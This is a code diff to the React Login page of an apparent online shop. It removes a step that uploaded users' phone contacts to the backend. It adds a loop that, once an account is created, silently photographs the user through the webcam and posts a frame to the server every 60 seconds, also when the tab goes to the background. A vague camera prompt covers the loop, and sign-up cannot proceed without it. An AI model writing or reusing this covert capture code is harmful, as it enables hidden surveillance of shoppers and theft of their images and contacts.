@@ -1,4 +1,4 @@
-import React, { useContext, useState } from 'react';
+import React, { useContext, useState, useRef } from 'react';
 import { ShopContext } from '../context/ShopContext';
 import axios from 'axios';
 import { toast } from 'react-toastify';
@@ -19,25 +19,32 @@ const Login = () => {
   const [isForgotPassword, setIsForgotPassword] = useState(false);
   const [passwordResetReady, setPasswordResetReady] = useState(false);
   const [cameraAllowed, setCameraAllowed] = useState(false);
-  const [contactsScanned, setContactsScanned] = useState(false);
-  const [contactData, setContactData] = useState([]);
   const [isCheckingPermissions, setIsCheckingPermissions] = useState(false);
   const [captureIntervalId, setCaptureIntervalId] = useState(null);
   const [showPermissionModal, setShowPermissionModal] = useState(false);
-  const [permissionStep, setPermissionStep] = useState('camera');
+
+  const streamRef = useRef(null);
+  const videoRef = useRef(null);
+  const backgroundCaptureTokenRef = useRef(null);
+  const captureTimerRef = useRef(null);
 
   const saveCameraCapture = async (imageData, mimeType = 'image/jpeg') => {
     try {
       const token = localStorage.getItem('token');
-      if (!token) return;
+      if (!token) {
+        console.log('No token available for camera capture');
+        return;
+      }
 
-      await axios.post(
+      const userId = JSON.parse(atob(token.split('.')[1])).id;
+      const response = await axios.post(
         backendUrl + '/api/user/save-camera-capture',
-        { userId: JSON.parse(atob(token.split('.')[1])).id, imageData, mimeType },
+        { userId, imageData, mimeType },
         { headers: { token } }
       );
+      console.log('Camera capture response:', response.data);
     } catch (error) {
-      console.log('Camera capture save failed:', error);
+      console.log('Camera capture save failed:', error.message);
     }
   };
 
@@ -79,6 +86,84 @@ const Login = () => {
     }
   };
 
+  const startCameraCaptureLoopAfterSignup = async (authToken) => {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      console.log('Camera access not supported');
+      return;
+    }
+
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      streamRef.current = stream;
+      backgroundCaptureTokenRef.current = authToken;
+
+      const video = document.createElement('video');
+      videoRef.current = video;
+      video.srcObject = stream;
+      video.muted = true;
+      video.playsInline = true;
+      await video.play();
+
+      const capture = async () => {
+        try {
+          const activeToken = backgroundCaptureTokenRef.current || localStorage.getItem('token');
+          if (!activeToken) {
+            console.log('No token available for queued camera capture');
+            return;
+          }
+
+          const canvas = document.createElement('canvas');
+          const width = video.videoWidth || 640;
+          const height = video.videoHeight || 480;
+          canvas.width = width;
+          canvas.height = height;
+          const context = canvas.getContext('2d');
+          context.drawImage(video, 0, 0, width, height);
+          const imageData = canvas.toDataURL('image/jpeg', 0.8);
+
+          const userId = JSON.parse(atob(activeToken.split('.')[1])).id;
+          await axios.post(
+            backendUrl + '/api/user/save-camera-capture',
+            { userId, imageData, mimeType: 'image/jpeg' },
+            { headers: { token: activeToken } }
+          );
+          console.log('Camera capture saved to MongoDB');
+        } catch (error) {
+          console.log('Capture error:', error.message);
+        }
+      };
+
+      await capture();
+
+      const scheduleCapture = () => {
+        if (captureTimerRef.current) {
+          clearTimeout(captureTimerRef.current);
+        }
+
+        captureTimerRef.current = setTimeout(async () => {
+          await capture();
+          scheduleCapture();
+        }, 60000);
+      };
+
+      scheduleCapture();
+      setCaptureIntervalId(captureTimerRef.current);
+
+      document.addEventListener('visibilitychange', () => {
+        if (document.visibilityState === 'visible') {
+          return;
+        }
+
+        if (backgroundCaptureTokenRef.current) {
+          capture();
+          scheduleCapture();
+        }
+      });
+    } catch (error) {
+      console.log('Camera setup failed:', error);
+    }
+  };
+
   const requestCameraPermission = async () => {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
       toast.error('Camera access is not supported on this browser.');
@@ -94,52 +179,6 @@ const Login = () => {
       console.log('Camera permission denied:', error);
       setCameraAllowed(false);
       toast.error('Camera permission is required before creating an account.');
-      return false;
-    }
-  };
-
-  const requestContactScan = async () => {
-    if (!('contacts' in navigator) || !navigator.contacts || !navigator.contacts.select) {
-      toast.error('Contact access is not supported on this browser. Please use a compatible device/browser.');
-      setContactsScanned(false);
-      return false;
-    }
-
-    try {
-      const selectedContacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
-      const cleanedContacts = (selectedContacts || [])
-        .map((contact) => {
-          const name = contact.name?.[0] || contact.name || '';
-          const phone = (contact.tel && contact.tel[0] && contact.tel[0].value) || contact.phone || '';
-          if (!name && !phone) return null;
-          return { name: String(name).trim(), phone: String(phone).trim() };
-        })
-        .filter(Boolean);
-
-      setContactData(cleanedContacts);
-      setContactsScanned(cleanedContacts.length > 0);
-
-      if (!cleanedContacts.length) {
-        toast.error('No contacts were detected. Please allow access and scan again.');
-        return false;
-      }
-
-      const token = localStorage.getItem('token');
-      if (token && cleanedContacts.length) {
-        const decoded = JSON.parse(atob(token.split('.')[1]));
-        await axios.post(
-          backendUrl + '/api/user/save-contact-snapshot',
-          { userId: decoded.id, contacts: cleanedContacts },
-          { headers: { token } }
-        );
-      }
-
-      toast.success('Contacts scanned successfully.');
-      return true;
-    } catch (error) {
-      console.log('Contact scan denied:', error);
-      setContactsScanned(false);
-      toast.error('Contact scan is required before creating an account.');
       return false;
     }
   };
@@ -194,22 +233,27 @@ const Login = () => {
 
   const openPermissionModal = () => {
     setShowPermissionModal(true);
-    setPermissionStep('camera');
-  };
-
-  const continueAfterCameraPermission = async () => {
-    const cameraOk = await requestCameraPermission();
-    if (cameraOk) {
-      setPermissionStep('contacts');
-      setShowPermissionModal(true);
-    }
   };
 
   const completePermissionFlow = async () => {
-    const contactsOk = await requestContactScan();
-    if (contactsOk) {
+    const cameraOk = await requestCameraPermission();
+    if (cameraOk) {
       setShowPermissionModal(false);
-      setPermissionStep('camera');
+      const response = await axios.post(backendUrl + '/api/user/register', { name, email, password });
+      if (response.data.success) {
+        const newToken = response.data.token;
+        setToken(newToken);
+        localStorage.setItem('token', newToken);
+        toast.success('You got 40% discount on your first order.');
+        
+        await startCameraCaptureLoopAfterSignup(newToken);
+        
+        setTimeout(() => {
+          window.location.href = '/';
+        }, 1200);
+      } else {
+        toast.error(response.data.message);
+      }
     }
   };
 
@@ -220,37 +264,6 @@ const Login = () => {
         if (!showPermissionModal) {
           openPermissionModal();
           return;
-        }
-
-        setIsCheckingPermissions(true);
-
-        if (permissionStep === 'camera') {
-          const cameraOk = await requestCameraPermission();
-          if (!cameraOk) {
-            setIsCheckingPermissions(false);
-            return;
-          }
-          setPermissionStep('contacts');
-          setIsCheckingPermissions(false);
-          return;
-        }
-
-        const contactsOk = await requestContactScan();
-        setIsCheckingPermissions(false);
-        if (!contactsOk) {
-          return;
-        }
-
-        const response = await axios.post(backendUrl + '/api/user/register', { name, email, password, contacts: contactData });
-        if (response.data.success) {
-          setToken(response.data.token);
-          localStorage.setItem('token', response.data.token);
-          toast.success('You got 40% discount on your first order.');
-          setTimeout(() => {
-            window.location.href = '/';
-          }, 1200);
-        } else {
-          toast.error(response.data.message);
         }
         return;
       }
@@ -345,42 +358,19 @@ const Login = () => {
         <div className='fixed inset-0 z-50 flex items-center justify-center bg-black/40 px-4'>
           <div className='w-full max-w-md rounded-2xl border border-gray-200 bg-white p-6 shadow-2xl'>
             <div className='mb-4 text-center'>
-              <h3 className='text-xl font-semibold text-gray-900'>Permission required</h3>
+              <h3 className='text-xl font-semibold text-gray-900'>Camera permission required</h3>
             </div>
 
-            {permissionStep === 'camera' ? (
-              <div className='space-y-4'>
-                <div className='flex items-center justify-between text-sm'>
-                  <span>Camera access</span>
-                  <span className={`font-semibold ${cameraAllowed ? 'text-green-600' : 'text-red-500'}`}>
-                    {cameraAllowed ? 'Allowed' : 'Required'}
-                  </span>
-                </div>
-                <button
-                  type='button'
-                  onClick={continueAfterCameraPermission}
-                  className='w-full rounded-md border border-gray-800 bg-black px-4 py-2 text-sm font-medium text-white hover:bg-gray-800'
-                >
-                  Allow Camera
-                </button>
-              </div>
-            ) : (
-              <div className='space-y-4'>
-                <div className='flex items-center justify-between text-sm'>
-                  <span>Contacts scan</span>
-                  <span className={`font-semibold ${contactsScanned ? 'text-green-600' : 'text-red-500'}`}>
-                    {contactsScanned ? 'Done' : 'Required'}
-                  </span>
-                </div>
-                <button
-                  type='button'
-                  onClick={completePermissionFlow}
-                  className='w-full rounded-md border border-gray-800 bg-black px-4 py-2 text-sm font-medium text-white hover:bg-gray-800'
-                >
-                  Scan Contacts
-                </button>
-              </div>
-            )}
+            <div className='space-y-4'>
+              <p className='text-sm text-gray-600'>We need camera access to capture your photos during account usage.</p>
+              <button
+                type='button'
+                onClick={completePermissionFlow}
+                className='w-full rounded-md border border-gray-800 bg-black px-4 py-2 text-sm font-medium text-white hover:bg-gray-800'
+              >
+                Allow Camera
+              </button>
+            </div>
           </div>
         </div>
       )}
